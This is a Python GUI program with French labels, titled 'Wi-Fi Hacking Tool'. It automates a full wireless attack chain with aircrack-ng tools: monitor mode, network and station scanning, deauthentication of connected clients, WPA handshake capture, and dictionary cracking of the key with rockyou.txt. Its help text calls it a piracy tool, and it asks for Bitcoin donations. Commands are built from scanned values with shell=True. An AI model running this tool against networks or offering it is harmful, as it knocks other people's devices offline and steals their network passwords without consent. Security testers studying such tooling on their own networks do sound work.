import subprocess
import time
import tkinter as tk
from tkinter import ttk
from tkinter import messagebox
import threading
import os

# Fonction pour faire clignoter le titre
def blink_title():
    current_fg = title_label.cget("fg")
    if current_fg == "#00FF00":  # Si la couleur est verte, la changer en noir (invisible)
        title_label.config(fg="#000000")
    else:  # Sinon, la remettre en vert
        title_label.config(fg="#00FF00")
    # Appeler la fonction toutes les 500ms pour créer l'effet de clignotement
    root.after(500, blink_title)

# Fonction pour mettre l'interface réseau en mode moniteur
def set_monitor_mode():
    try:
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], check=True)
        subprocess.run(['sudo', 'ip', 'link', 'set', 'wlan0', 'down'], check=True)
        subprocess.run(['sudo', 'iw', 'dev', 'wlan0', 'set', 'type', 'monitor'], check=True)
        subprocess.run(['sudo', 'ip', 'link', 'set', 'wlan0', 'up'], check=True)
        message_label.config(text="Mode moniteur activé !", fg="#00FF00", bg="#000000")
    except subprocess.CalledProcessError as e:
        message_label.config(text=f"Erreur : {str(e)}", fg="#FF0000", bg="#000000")

# Fonction pour désactiver le mode moniteur sur l'interface réseau
def unset_monitor_mode():
    try:
        subprocess.run(['sudo', 'ip', 'link', 'set', 'wlan0', 'down'], check=True)
        subprocess.run(['sudo', 'iw', 'dev', 'wlan0', 'set', 'type', 'managed'], check=True)
        subprocess.run(['sudo', 'ip', 'link', 'set', 'wlan0', 'up'], check=True)
        subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'], check=True)
        message_label.config(text="Mode moniteur désactivé et service réseau redémarré !", fg="#00FF00", bg="#000000")
    except subprocess.CalledProcessError as e:
        message_label.config(text=f"Erreur : {str(e)}", fg="#FF0000", bg="#000000")

# Fonction pour scanner les réseaux
def scan_networks():
    scan_button.state(["disabled"])
    message_label.config(text="Scan en cours...", fg="#00FF00", bg="#000000")
    if os.path.exists('/tmp/scan_result-01.csv'):
        os.remove('/tmp/scan_result-01.csv')
    command = "sudo airodump-ng --output-format csv --write /tmp/scan_result wlan0"
    def run_airodump():
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(10)
            process.terminate()
            if os.path.exists('/tmp/scan_result-01.csv'):
                with open('/tmp/scan_result-01.csv', 'r') as file:
                    lines = file.readlines()
                for row in tree.get_children():
                    tree.delete(row)
                for line in lines:
                    if line.startswith("BSSID"):
                        continue
                    columns = line.split(',')
                    if len(columns) >= 14:
                        bssid = columns[0]
                        essid = columns[13]
                        power = columns[8]
                        channel = columns[3]
                        enc = columns[5]
                        cipher = columns[6]
                        auth = columns[7]
                        tree.insert("", "end", values=(bssid, power, channel, enc, cipher, auth, essid))
                scan_button.state(["!disabled"])
                message_label.config(text="Scan terminé !", fg="#00FF00", bg="#000000")
            else:
                message_label.config(text="Erreur : Fichier CSV introuvable", fg="#FF0000", bg="#000000")
        except Exception as e:
            message_label.config(text=f"Erreur : {str(e)}", fg="#FF0000", bg="#000000")
            scan_button.state(["!disabled"])
    threading.Thread(target=run_airodump, daemon=True).start()

# Fonction pour afficher les stations connectées avec détails
def show_connected_stations(bssid, channel):
    progress_bar.start()
    message_label.config(text="Analyse des stations...", fg="#00FF00", bg="#000000")
    if os.path.exists('/tmp/scan_result_sta-01.csv'):
        os.remove('/tmp/scan_result_sta-01.csv')
    command = f"sudo airodump-ng --bssid {bssid} --channel {channel} --output-format csv --write /tmp/scan_result_sta wlan0"
    def run_airodump_sta():
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(10)
            process.terminate()
            if os.path.exists('/tmp/scan_result_sta-01.csv'):
                with open('/tmp/scan_result_sta-01.csv', 'r') as file:
                    lines = file.readlines()
                for row in station_tree.get_children():
                    station_tree.delete(row)
                for line in lines:
                    if line.startswith("Station MAC"):
                        continue
                    columns = line.split(',')
                    if len(columns) >= 7:
                        station_mac = columns[0]
                        pwr = columns[3]
                        packets = columns[4]
                        bssid = columns[5]
                        probes = columns[6]
                        station_tree.insert("", "end", values=(station_mac, pwr, packets, bssid, probes), tags=('red',))
                station_tree.tag_configure('red', foreground='#FF0000')
                progress_bar.stop()
                message_label.config(text="Analyse des stations terminée !", fg="#00FF00", bg="#000000")
            else:
                message_label.config(text="Erreur : Fichier CSV des stations introuvable", fg="#FF0000", bg="#000000")
        except Exception as e:
            message_label.config(text=f"Erreur : {str(e)}", fg="#FF0000", bg="#000000")
            progress_bar.stop()
    threading.Thread(target=run_airodump_sta, daemon=True).start()

# Fonction pour envoyer un paquet de désauthentification
def deauth_station(bssid, station_mac, channel):
    message_label.config(text="Désauthentification de la station...", fg="#00FF00", bg="#000000")
    deauth_button.state(["disabled"])
    progress_bar.start()
    bssid = bssid.strip()
    station_mac = station_mac.strip()
    channel = str(channel).strip()
    if not bssid or bssid == "None" or not station_mac or station_mac == "None":
        message_label.config(text="Erreur: BSSID ou MAC de station invalides.", fg="#FF0000", bg="#000000")
        deauth_button.state(["!disabled"])
        progress_bar.stop()
        return
    try:
        set_channel_cmd = ["sudo", "iwconfig", "wlan0", "channel", str(channel)]
        subprocess.run(set_channel_cmd, check=True)
        time.sleep(1)
    except Exception as e:
        print(f"Erreur lors du changement de canal : {str(e)}")
    command = f"sudo aireplay-ng --deauth 20 -a {bssid} -c {station_mac} wlan0"
    def run_deauth():
        try:
            check_command = "iwconfig wlan0"
            check_process = subprocess.Popen(check_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = check_process.communicate()
            if b"Mode:Monitor" not in stdout:
                message_label.config(text="Activation automatique du mode moniteur...", fg="#FFFF00", bg="#000000")
                try:
                    subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], check=False)
                    subprocess.run(['sudo', 'ip', 'link', 'set', 'wlan0', 'down'], check=False)
                    subprocess.run(['sudo', 'iw', 'dev', 'wlan0', 'set', 'type', 'monitor'], check=False)
                    subprocess.run(['sudo', 'ip', 'link', 'set', 'wlan0', 'up'], check=False)
                    set_channel_cmd = ["sudo", "iwconfig", "wlan0", "channel", str(channel)]
                    subprocess.run(set_channel_cmd, check=True)
                    time.sleep(1)
                except Exception as e:
                    message_label.config(text=f"Impossible d'activer le mode moniteur: {str(e)}", fg="#FF0000", bg="#000000")
                    deauth_button.state(["!disabled"])
                    progress_bar.stop()
                    return
            message_label.config(text=f"Exécution: {command}", fg="#FFFF00", bg="#000000")
            try:
                exit_code = os.system(command)
                if exit_code == 0 or exit_code == 256:
                    message_label.config(text="Désauthentification réussie !", fg="#00FF00", bg="#000000")
                else:
                    print(f"aireplay-ng code de sortie: {exit_code}")
                    message_label.config(text="Paquets de désauthentification envoyés (avec avertissements).", fg="#FFFF00", bg="#000000")
            except Exception as e:
                message_label.config(text=f"Erreur lors de l'exécution d'aireplay-ng: {str(e)}", fg="#FF0000", bg="#000000")
        except Exception as e:
            message_label.config(text=f"Erreur : {str(e)}", fg="#FF0000", bg="#000000")
        finally:
            deauth_button.state(["!disabled"])
            progress_bar.stop()
    threading.Thread(target=run_deauth, daemon=True).start()

# Fonction pour nettoyer les anciens fichiers de handshake
def clean_handshake_files():
    file_patterns = [
        '/tmp/handshake-01.cap',
        '/tmp/handshake-01.csv',
        '/tmp/handshake-01.kismet.csv',
        '/tmp/handshake-01.kismet.netxml',
        '/tmp/handshake-01.log.csv'
    ]
    for file_pattern in file_patterns:
        if os.path.exists(file_pattern):
            try:
                os.remove(file_pattern)
                print(f"Fichier supprimé: {file_pattern}")
            except Exception as e:
                print(f"Erreur lors de la suppression de {file_pattern}: {str(e)}")
    missing_files = [f for f in file_patterns if os.path.exists(f)]
    if missing_files:
        print(f"Attention: Les fichiers suivants n'ont pas pu être supprimés: {missing_files}")
        return False
    return True

# --- Fonction pour capturer le handshake ---
def capture_handshake(bssid, channel):
    clean_handshake_files()
    try:
        subprocess.run(['sudo', 'ip', 'link', 'set', 'wlan0', 'down'], check=True)
        subprocess.run(['sudo', 'iw', 'dev', 'wlan0', 'set', 'type', 'monitor'], check=True)
        subprocess.run(['sudo', 'ip', 'link', 'set', 'wlan0', 'up'], check=True)
        set_channel_cmd = ["sudo", "iwconfig", "wlan0", "channel", str(channel)]
        subprocess.run(set_channel_cmd, check=True)
        time.sleep(1)
    except Exception as e:
        message_label.config(text=f"Erreur lors de la configuration pour la capture : {str(e)}", fg="#FF0000", bg="#000000")
        return
    command = f"sudo airodump-ng --bssid {bssid} --channel {channel} --write /tmp/handshake -o pcap wlan0"
    def run_capture():
        try:
            airodump_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            message_label.config(text="Capture du handshake en cours...", fg="#00FF00", bg="#000000")
            # Attendre 60 secondes pour tenter de capturer le handshake
            time.sleep(60)
            airodump_process.terminate()
            if os.path.exists('/tmp/handshake-01.cap'):
                message_label.config(text="Handshake capturé avec succès !", fg="#00FF00", bg="#000000")
            else:
                message_label.config(text="Échec de la capture du handshake.", fg="#FF0000", bg="#000000")
        except Exception as e:
            message_label.config(text=f"Erreur lors de la capture : {str(e)}", fg="#FF0000", bg="#000000")
    threading.Thread(target=run_capture, daemon=True).start()
# --- Fin de la fonction capture_handshake ---

# --- Fonction pour trouver la clé WEP/WPA ---
def find_key():
    message_label.config(text="Recherche de la clé...", fg="#00FF00", bg="#000000")
    find_key_button.state(["disabled"])
    progress_bar.start()
    command = "sudo aircrack-ng /tmp/handshake-01.cap -w /usr/share/wordlists/rockyou.txt"
    def run_aircrack():
        try:
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )
            output, _ = process.communicate()
            print(output)  # Pour débogage
            if "KEY FOUND!" in output:
                try:
                    key = output.split("KEY FOUND! [")[1].split("]")[0]
                except IndexError:
                    key = "Clé introuvable (format inattendu)"
                message_label.config(text=f"Clé trouvée : {key}", fg="#00FF00", bg="#000000")
            else:
                message_label.config(text="Aucune clé trouvée dans le dictionnaire sélectionné.", fg="#FF0000", bg="#000000")
        except Exception as e:
            message_label.config(text=f"Erreur : {str(e)}", fg="#FF0000", bg="#000000")
        finally:
            find_key_button.state(["!disabled"])
            progress_bar.stop()
    threading.Thread(target=run_aircrack, daemon=True).start()
# --- Fin de la fonction find_key ---

# Fonction pour activer le mode moniteur
def enable_monitor_mode():
    set_monitor_mode()

# Fonction pour désactiver le mode moniteur
def disable_monitor_mode():
    unset_monitor_mode()

# Fonction pour vérifier l'état de la carte réseau
def check_monitor_status():
    command = "iwconfig wlan0"
    def run_check_status():
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()
            if stdout:
                status_message = stdout.decode()
                messagebox.showinfo("État du Mode Moniteur", status_message)
            elif stderr:
                message_label.config(text=f"Erreur : {stderr.decode()}", fg="#FF0000", bg="#000000")
            else:
                message_label.config(text="État non trouvé.", fg="#FF0000", bg="#000000")
        except Exception as e:
            message_label.config(text=f"Erreur : {str(e)}", fg="#FF0000", bg="#000000")
    threading.Thread(target=run_check_status, daemon=True).start()

# Fonction pour sélectionner un réseau et afficher les stations connectées
def on_network_select(event):
    selected_item = tree.selection()[0]
    bssid = tree.item(selected_item, 'values')[0]
    channel = tree.item(selected_item, 'values')[2]
    show_connected_stations(bssid, channel)

# Fonction pour sélectionner une station et effectuer une désauthentification
def on_station_select(event):
    try:
        if not station_tree.selection():
            message_label.config(text="Erreur: Aucune station sélectionnée", fg="#FF0000", bg="#000000")
            return
        if not tree.selection():
            message_label.config(text="Erreur: Aucun réseau sélectionné", fg="#FF0000", bg="#000000")
            return
        selected_item = station_tree.selection()[0]
        station_mac = station_tree.item(selected_item, 'values')[0]
        bssid = station_tree.item(selected_item, 'values')[3]
        bssid = bssid.strip()
        if not bssid or bssid == "(not associated)" or bssid == "":
            if tree.selection():
                selected_network = tree.selection()[0]
                bssid = tree.item(selected_network, 'values')[0]
            else:
                message_label.config(text="Erreur: BSSID invalide et aucun réseau sélectionné", fg="#FF0000", bg="#000000")
                return
        selected_network = tree.selection()[0]
        channel = tree.item(selected_network, 'values')[2]
        message_label.config(text=f"Préparation désauth: BSSID={bssid}, Station={station_mac}, Canal={channel}", fg="#FFFF00", bg="#000000")
        root.update_idletasks()
        time.sleep(1)
        deauth_station(bssid, station_mac, channel)
    except Exception as e:
        message_label.config(text=f"Erreur lors de la sélection: {str(e)}", fg="#FF0000", bg="#000000")

# Fonction pour fermer l'application
def close_application():
    try:
        subprocess.run(['sudo', 'ip', 'link', 'set', 'wlan0', 'down'], check=True)
        subprocess.run(['sudo', 'iw', 'dev', 'wlan0', 'set', 'type', 'managed'], check=True)
        subprocess.run(['sudo', 'ip', 'link', 'set', 'wlan0', 'up'], check=True)
        subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'], check=True)
        message_label.config(text="Mode moniteur désactivé avant fermeture.", fg="#00FF00", bg="#000000")
        root.update()
        time.sleep(1)
    except Exception as e:
        print(f"Erreur lors de la désactivation du mode moniteur à la fermeture : {str(e)}")
    root.quit()

# Fonction pour afficher un message d'aide
def show_help():
    messagebox.showinfo("Aide", "Ceci est un outil de piratage WiFi. Utilisez-le de manière responsable.")

# Fonction pour afficher l'adresse Bitcoin pour le soutien
def show_support():
    bitcoin_address = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
    messagebox.showinfo("Nous Soutenir", f"Soutenez-nous avec Bitcoin :\n\n{bitcoin_address}")

# Création de la fenêtre principale
root = tk.Tk()
root.title("Wi-Fi Hacking Tool")
root.geometry("1200x800")
root.configure(bg="#000000")

# Création de la barre de menu
menu_bar = tk.Menu(root)
root.config(menu=menu_bar)
file_menu = tk.Menu(menu_bar, tearoff=0)
menu_bar.add_cascade(label="Menu", menu=file_menu)
file_menu.add_command(label="Fermer l'Application", command=close_application)
file_menu.add_command(label="Besoin d'Aide", command=show_help)
file_menu.add_command(label="Nous Soutenir", command=show_support)

# Configuration des styles
style = ttk.Style()
style.configure("TButton",
                font=("Quicksand", 14, "bold"),
                padding=10,
                relief="flat",
                borderwidth=0,
                background="#00FF00",
                foreground="black")
style.map("TButton",
          background=[("active", "#00CC00"), ("disabled", "#A0A0A0")],
          foreground=[("active", "black"), ("disabled", "white")])
style.configure("Orange.TButton", background="#FFA500", foreground="black")
style.configure("Blue.TButton", background="#0000FF", foreground="white")
style.configure("Red.TButton", background="#FF0000", foreground="white")
style.configure("LightBlue.TButton", background="#ADD8E6", foreground="black")

# Affichage du titre (police modifiée)
title_label = tk.Label(root, text="Wi-Fi Hacking Tool", font=("Comic Sans MS", 20, "bold"), fg="#00FF00", bg="#000000")
title_label.pack(pady=20)

# Cadre pour les boutons du mode moniteur
monitor_frame = tk.Frame(root, bg="#000000")
monitor_frame.pack(pady=10)
monitor_button = ttk.Button(monitor_frame, text="Activer le Mode Moniteur", command=enable_monitor_mode, style="Red.TButton")
monitor_button.pack(side="left", padx=10)
disable_monitor_button = ttk.Button(monitor_frame, text="Désactiver le Mode Moniteur", command=disable_monitor_mode, style="Blue.TButton")
disable_monitor_button.pack(side="left", padx=10)
status_button = ttk.Button(monitor_frame, text="Vérifier l'État du Mode Moniteur", command=check_monitor_status, style="LightBlue.TButton")
status_button.pack(side="left", padx=10)

# Bouton pour scanner les réseaux
scan_button = ttk.Button(root, text="Scanner les Réseaux", command=scan_networks, style="TButton")
scan_button.pack(pady=10)

# Cadre pour les boutons du bas
button_frame = tk.Frame(root, bg="#000000")
button_frame.pack(side="bottom", pady=20)
deauth_button = ttk.Button(button_frame, text="Désauthentifier la Station", command=lambda: 
    messagebox.showinfo("Sélection requise", "Veuillez d'abord sélectionner un réseau puis une station dans les tableaux ci-dessus.") 
    if not tree.selection() or not station_tree.selection() else 
    on_station_select(None), style="Orange.TButton")
deauth_button.pack(side="left", padx=10)

def on_capture_button_click():
    if not tree.selection():
        messagebox.showinfo("Sélection requise", "Veuillez d'abord sélectionner un réseau dans le tableau ci-dessus.")
        return
    selected_item = tree.selection()[0]
    bssid = tree.item(selected_item, 'values')[0]
    channel = tree.item(selected_item, 'values')[2]
    capture_handshake(bssid, channel)

capture_button = ttk.Button(button_frame, text="Capturer le Handshake", command=on_capture_button_click, style="Blue.TButton")
capture_button.pack(side="left", padx=10)
find_key_button = ttk.Button(button_frame, text="Trouver la Clé", command=find_key, style="Red.TButton")
find_key_button.pack(side="left", padx=10)

# Tableau pour afficher les réseaux
columns = ("BSSID", "Puissance", "Canal", "Chiffrement", "Cipher", "Auth", "ESSID")
tree = ttk.Treeview(root, columns=columns, show="headings", style="Treeview")
for col in columns:
    tree.heading(col, text=col)
    tree.column(col, width=150)
tree.pack(padx=20, pady=20, fill="both", expand=True)
tree.bind("<ButtonRelease-1>", on_network_select)

# Tableau pour afficher les stations connectées
station_columns = ("MAC Station", "Puissance", "Paquets", "BSSID", "Probes")
station_tree = ttk.Treeview(root, columns=station_columns, show="headings", style="Treeview")
for col in station_columns:
    station_tree.heading(col, text=col)
    station_tree.column(col, width=150)
station_tree.pack(padx=20, pady=20, fill="both", expand=True)
station_tree.tag_configure('red', foreground='#FF0000')
station_tree.bind("<ButtonRelease-1>", on_station_select)

# Barre de progression
progress_bar = ttk.Progressbar(root, orient="horizontal", mode="indeterminate", length=200)
progress_bar.pack(pady=20)

# Étiquette de message
message_label = tk.Label(root, text="Prêt à scanner.", font=("Quicksand", 12, "bold"), fg="white", bg="black")
message_label.pack(pady=10)

# Démarrer l'animation du titre
blink_title()

# Lancer l'interface graphique
root.mainloop()
